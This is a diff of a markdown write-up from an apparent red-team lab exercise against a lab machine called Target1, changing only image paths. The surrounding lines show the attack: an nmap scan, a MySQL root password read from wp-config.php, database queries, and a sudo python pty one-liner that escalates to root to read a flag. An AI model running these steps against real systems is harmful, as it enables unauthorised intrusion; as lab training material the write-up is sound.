@@ -16,7 +16,7 @@ Nmap scan results reveal the below services and OS details:
 
 nmap -sV 192.168.1.110
 
-![1](/Resources/Images/1/1.png)
+![1](/Resources/Images/1/3.png)
 
 ---
 
@@ -47,7 +47,7 @@ The Red Team was able to penetrate Target1 and retrieve the following confidenti
     
     |  | **Flag1** |
     | -- | -- |
-    | Using Google Chrome developer's Tools on the Url: `192.168.1.110/service.html` give a glance at the exposed sensitive data. | ![2](/Resources/Images/2/5.png)
+    | Using Google Chrome developer's Tools on the Url: `192.168.1.110/service.html` give a glance at the exposed sensitive data. | ![2](/Resources/Images/1/5.png)
   
      
 
@@ -73,7 +73,7 @@ The Red Team was able to penetrate Target1 and retrieve the following confidenti
 
     **Flag2**
 
-    ![3](/Resources/Images/2/8.png)
+    ![3](/Resources/Images/1/8.png)
 
 ---
 
@@ -87,7 +87,7 @@ The Red Team was able to penetrate Target1 and retrieve the following confidenti
    
     | MySQL Root Password | Flag3 |
     | -- | -- |
-    | ``nano wp-config.php`` <br /> Password: R@v3nSecurity <br /> <br />![4](/Resources/Images/2/9.png)  | `mysql -u root -p` <br /> Password: R@v3nSecurity <br /> `mysql> show databases;` `mysql> use wordpress;` <br />  `mysql> show tables;` <br /> `mysql> select * from wp_posts;` <br />  <br />![11](/Resources/Images/2/22.png) 
+    | ``nano wp-config.php`` <br /> Password: R@v3nSecurity <br /> <br />![4](/Resources/Images/1/9.png)  | `mysql -u root -p` <br /> Password: R@v3nSecurity <br /> `mysql> show databases;` `mysql> use wordpress;` <br />  `mysql> show tables;` <br /> `mysql> select * from wp_posts;` <br />  <br />![11](/Resources/Images/1/22.png) 
 
     >#### note: Flag4 also appears in this exploit.
 
@@ -110,10 +110,10 @@ The Red Team was able to penetrate Target1 and retrieve the following confidenti
             sudo -l  
         ```
     
-        ![8](/Resources/Images/2/16.png)
+        ![8](/Resources/Images/1/16.png)
 
     2. Python Script
     
         sudo python -c 'import pty;pty.spawn("/bin/bash")' | **Flag4**: cat /root/flag4.txt
         ---|---
-        ![9](/Resources/Images/2/17.png) |   ![10](/Resources/Images/2/19.png)
+        ![9](/Resources/Images/1/17.png) |   ![10](/Resources/Images/1/19.png)
